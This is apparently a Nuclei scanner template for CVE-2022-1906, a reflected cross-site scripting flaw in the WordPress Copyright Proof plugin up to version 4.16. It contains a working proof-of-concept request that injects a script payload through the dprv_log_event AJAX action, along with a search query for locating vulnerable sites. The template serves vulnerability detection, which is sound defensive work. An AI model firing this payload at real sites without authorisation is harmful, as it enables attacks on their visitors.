http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - got message <script>alert(document.domain)</script>
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /wp-admin/admin-ajax.php?action=dprv_log_event&message=%3Cscript%3Ealert(document.domain)%3C/script%3E
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2022-1906
info:
  author: random-robbie
  classification:
    cpe: cpe:2.3:a:digiprove:copyright_proof:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2022-1906
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.90222
    epss-score: 0.05846
  description: 'WordPress Copyright Proof plugin 4.16 and prior contains a cross-site
    scripting vulnerability. It does not sanitize and escape a parameter before outputting
    it back via an AJAX action available to both unauthenticated and authenticated
    users when a specific setting is enabled.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    inject malicious scripts into web pages viewed by users, leading to potential
    data theft, session hijacking, or defacement of the affected website.

    '
  metadata:
    framework: wordpress
    google-query: inurl:/wp-content/plugins/digiproveblog
    max-request: 1
    product: copyright_proof
    vendor: digiprove
    verified: true
  name: WordPress Copyright Proof <=4.16 - Cross-Site-Scripting
  reference:
  - https://wpscan.com/vulnerability/af4f459e-e60b-4384-aad9-0dc18aa3b338
  - https://nvd.nist.gov/vuln/detail/CVE-2022-1906
  - https://github.com/ARPSyndicate/kenzer-templates
  - https://github.com/cyllective/CVEs
  remediation: 'Update to the latest version of WordPress Copyright Proof plugin (>=4.17)
    which includes proper input sanitization and validation.

    '
  severity: medium
  tags: cve,cve2022,wordpress,xss,wp-plugin,wp,wpscan,digiprove,vuln
